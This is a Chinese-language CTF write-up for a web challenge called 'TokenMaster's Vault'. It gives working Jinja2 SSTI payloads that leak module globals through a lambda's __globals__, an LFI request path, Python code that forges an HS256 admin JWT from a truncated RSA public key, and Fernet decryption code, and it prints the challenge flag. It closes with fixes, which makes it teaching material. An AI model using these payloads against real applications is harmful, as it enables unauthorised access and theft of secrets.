# TokenMaster's Vault

## 题目简述

题目设计了一条 LFI、SSTI、公钥泄露、JWT RS256/HS256 混淆和 Fernet 解密链。但源码中的“受限 SSTI”实际使用普通 `jinja2.Environment`，并把本模块创建的 lambda 暴露给模板；通过函数的 `__globals__` 可直接读取 `ENCRYPTED_FLAG` 与 `FLAG_KEY`。因此真实最短解只需普通用户创建一条 Note 并离线解密。下文先给出这条可由当前源码直接证明的短链，再完整说明官方预期链及其中需要修正的请求路径。

## 解题过程

### 登录普通账户并确认 SSTI

源码内置普通凭据：

```text
guest / guest123
```

创建 Note 后，`/view_note/<id>` 不是把内容当纯文本，而是再次编译：

```python
env = jinja2.Environment(autoescape=True, loader=None)
env.globals = restricted_globals
template = env.from_string(note_content)
rendered_content = template.render()
```

这里使用的是普通 `Environment`，不是 `jinja2.sandbox.SandboxedEnvironment`；`autoescape` 只做 HTML 转义，不限制属性访问或函数调用。用 `{{ 7 * 7 }}` 即可得到 `49`，确认 SSTI。

### 利用包装函数泄露模块全局变量

应用试图只暴露 `range`、`len`、`str`、`int` 和受限 `config`，但又把可调用对象包装成当前模块定义的 lambda：

```python
original_func = obj
restricted_globals[key] = lambda *args, **kwargs: original_func(*args, **kwargs)
```

Python 函数的 `__globals__` 指向定义它的模块全局字典。该字典恰好包含：

```python
FLAG_KEY
ENCRYPTED_FLAG
PUBLIC_KEY
PRIVATE_KEY
users
```

因此创建以下 Note：

```jinja2
{{ range.__globals__['ENCRYPTED_FLAG'] }}
::SPLIT::
{{ range.__globals__['FLAG_KEY'] }}
```

访问新 Note 即可得到 Fernet token 与 32 字符解密口令。`range`、`len`、`str`、`int` 中任意一个包装 lambda 都能到达同一 `__globals__`；所谓 `RestrictedConfig` 对这条路径没有作用。

### 离线执行 Fernet 解密

服务生成密文时先对 32 字符口令做 SHA-256，再用 URL-safe Base64 编码为 Fernet key。按相同过程解密：

```python
import base64
import hashlib
from cryptography.fernet import Fernet

encrypted_flag = "从 Note 输出取得的 Fernet token"
api_key = "从 Note 输出取得的 32 字符 FLAG_KEY"

fernet_key = base64.urlsafe_b64encode(
    hashlib.sha256(api_key.encode()).digest()
)
plaintext = Fernet(fernet_key).decrypt(encrypted_flag.encode())
print(plaintext.decode())
```

当前归档中的 `encrypted_flag.txt` 与 `secret_config.py` 已按此过程本地核对，结果为：

```text
shellmates{JWT_4lg0_c0nfus10n_w1th_LF1_4nd_SST1_m4k3s_4_d4ng3r0us_m1x}
```

这条路线不需要管理员 JWT，也不需要读取服务端文件；它直接否定了官方说明中“每一环都不可跳过”的断言。

### 官方预期链：LFI 读取认证实现

为了完整保留出题机制，官方路线仍值得说明。普通用户访问 `/profile` 时，参数只有包含 `/` 或 `\` 才会进入文件读取分支；专门允许的源码路径是 `./app.py`：

```text
/profile?template=./app.py
```

官方 README 写成 `/profile?template=app.py`，按当前源码会走 `render_template('app.py')` 并失败，应以上述路径为准。读到的源码揭示：

- `_validate_signature` 根据 JWT header 自行选择 RS256 或 HS256；
- 验证后又用 `jwt.decode(..., verify=False)` 读取并信任 `role`；
- HS256 secret 是清理后的 RSA 公钥前 `HMAC_LENGTH` 字符；
- Note 存在模板注入；
- 管理员分别从 `/admin/vault` 和 `/admin/api` 取得密文与解密口令。

### 官方预期链：取得公钥与 HMAC 长度

每次验证 JWT 时，应用都会执行：

```python
app.config['VALIDATION_KEY'] = PUBLIC_KEY.strip()
```

创建 Note：

```jinja2
{{ config.get('VALIDATION_KEY') }}
```

即可通过特意允许的 `RestrictedConfig.get` 输出完整 PEM 公钥。然后访问无需登录的 `/system/config`，查看 404 页源代码；隐藏注释和 `data-error-config` 都会显示：

```text
security.hmac.signature.length = 121
```

### 官方预期链：伪造 HS256 管理员 Token

服务端验证分支把 PEM 头尾和换行去掉，再取前 121 个字符作为 HMAC secret：

```python
clean_key = public_key.replace(
    '-----BEGIN PUBLIC KEY-----', ''
).replace(
    '-----END PUBLIC KEY-----', ''
).replace('\n', '').strip()

hmac_secret = clean_key[:121]
```

据此签发一个尚未过期的 HS256 Token：

```python
import time
import jwt

payload = {
    "username": "admin",
    "role": "admin",
    "exp": int(time.time()) + 3600,
}
token = jwt.encode(payload, hmac_secret, algorithm="HS256")
if isinstance(token, bytes):
    token = token.decode()
print(token)
```

把它设为 `auth_token` Cookie。`_validate_signature` 会按 HS256 与截断公钥验证，后续无验证解码又直接接受攻击者给出的 `role=admin`，于是可读取 `/admin/vault` 与 `/admin/api`，最后执行前述 Fernet 解密。

## 方法总结

官方预期链展示了多漏洞组合，但真实源码审计必须先寻找更短的数据流。普通 Jinja `Environment` 不会因为删掉大部分 globals 就自动成为沙箱；暴露任何 Python 函数都可能通过 `__globals__` 回到模块对象。本题还提醒我们，JWT 验证算法不能由未验证 header 决定，更不能把 RSA 公钥材料改作 HMAC secret。修复应同时使用 `SandboxedEnvironment` 或取消用户模板执行、固定 JWT 算法与密钥类型，并让授权角色来自服务端状态而非客户端 Claim。
